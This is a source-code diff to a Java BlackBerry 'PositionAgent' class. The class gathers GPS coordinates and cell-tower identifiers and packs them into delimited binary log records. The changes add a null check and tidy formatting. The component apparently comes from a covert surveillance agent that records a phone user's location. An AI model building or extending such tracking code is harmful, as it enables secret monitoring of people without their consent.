@@ -115,8 +115,13 @@ public final class PositionAgent extends Agent implements LocationListener {
                         .setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);
 
                 lp = LocationProvider.getInstance(criteria);
-                
 
+                if (lp == null) {
+                    //#ifdef DEBUG_ERROR
+                    debug.error("GPS Not Supported on Device");
+                    //#endif               
+
+                }
                 //lp.setLocationListener(this, period * 1000, -1, -1);
             }
 
@@ -133,7 +138,7 @@ public final class PositionAgent extends Agent implements LocationListener {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        if (gpsEnabled) {
+        if (gpsEnabled && lp != null) {
             locationGPS();
         }
         if (cellEnabled) {
@@ -152,8 +157,9 @@ public final class PositionAgent extends Agent implements LocationListener {
             // http://en.wikipedia.org/wiki/Mobile_Network_Code
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            final int mcc = Integer.parseInt(Integer.toHexString(cellinfo.getMCC()));
-                        
+            final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
+                    .getMCC()));
+
             final int mnc = cellinfo.getMNC();
             final int lac = cellinfo.getLAC();
             final int cid = cellinfo.getCellId();
@@ -178,9 +184,10 @@ public final class PositionAgent extends Agent implements LocationListener {
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
             final int nid = cellinfo.getNID();
-            final int bid = cellinfo.getBID();     
+            final int bid = cellinfo.getBID();
             //https://www.blackberry.com/jira/browse/JAVAAPI-641
-            final int mcc = RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex());
+            final int mcc = RadioInfo
+                    .getMCC(RadioInfo.getCurrentNetworkIndex());
 
             final StringBuffer mb = new StringBuffer();
             mb.append("SID: " + sid);
@@ -264,7 +271,7 @@ public final class PositionAgent extends Agent implements LocationListener {
         //#ifdef DEBUG_TRACE
         debug.trace("saveLog payload: " + payload.length);
         //#endif
-        
+
         int version = 2008121901;
         int delimiter = 0xABADC0DE;
         Date date = new Date();
@@ -276,14 +283,14 @@ public final class PositionAgent extends Agent implements LocationListener {
         final DataBuffer databuffer = new DataBuffer(message, 0, size, false);
 
         databuffer.writeInt(type);
-        
+
         // header
         databuffer.writeInt(size);
         databuffer.writeInt(version);
         databuffer.writeLong(DateTime.getFiledate(date));
 
         // payload
-        
+
         databuffer.write(payload);
 
         // delimiter
@@ -360,9 +367,8 @@ public final class PositionAgent extends Agent implements LocationListener {
         float course = loc.getCourse();
 
         //#ifdef DEBUG_INFO
-        debug.info("" +
-        		" " + speed + "|" + latitude + "|" + longitude
-                + "|" + course + "|" + date);
+        debug.info("" + " " + speed + "|" + latitude + "|" + longitude + "|"
+                + course + "|" + date);
         //#endif
 
         DateTime dateTime = new DateTime(date);
@@ -424,8 +430,8 @@ public final class PositionAgent extends Agent implements LocationListener {
         //#endif
 
         //#ifdef DBC
-        Check.ensures(databuffer.getPosition() == size, "saveGPSLog wrong size: "
-                + databuffer.getPosition());
+        Check.ensures(databuffer.getPosition() == size,
+                "saveGPSLog wrong size: " + databuffer.getPosition());
         //#endif
 
         return gpsPosition;
